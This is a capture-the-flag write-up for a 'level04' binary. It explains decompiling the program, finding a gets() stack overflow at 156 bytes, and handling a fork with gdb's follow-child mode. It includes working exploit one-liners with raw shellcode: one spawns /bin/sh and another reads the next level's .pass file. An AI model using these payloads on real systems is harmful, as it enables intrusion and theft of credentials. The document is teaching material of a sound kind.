### step 1: Decompile with Ghidra

We get the c source code of the program  

### step 2: Code analysis

- We find only a `main` function 
- In this function we find a vulnerable `gets` function which is not protected and that we will overflow.
- We don't find any `system` function calls so we plan to use a shellcode
- Finally we have a child process launched and it is in this process that the `gets` function is called

important !!
Since we have a parent and a child process we use the gdb command  `set follow-fork-mode child` to set gdb in `follow-child` mode

### step 3 : find the overflow 

```
( python -c 'print("A" * 156) ) | ./level04
```

We find that the overflow is at the 156 character

### step 4 : setup the exploit

Since we now the overflow position we setup our usual shellcode :

( python -c 'print("A" * 156 + "\xae\xde\xff\xff")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level04

However this exploit does not work because doesn't work because it switches to the parent process. Even if a shell is launched, we can't access it because the fork leads us to the parent process.

### step 5 : Use a cat shellcode for the final exploit 

D'habitude on utilise le shellcode pour lancer un bash,
Usually we use a sellcode which launches a shell. This time we will use a `cat` shellcode.

Here is a register with many shellcodes for many functions and architectures : https://shell-storm.org/shellcode/index.html

The cat shellcode which we will use : https://shell-storm.org/shellcode/files/shellcode-73.html

We add at the end of this shellcode the pass path and then we have the final exploit which will print us the .pass file :
```
( python -c 'print("A" * 156 + "\xae\xde\xff\xff")' ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 +  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")') ./level04
```

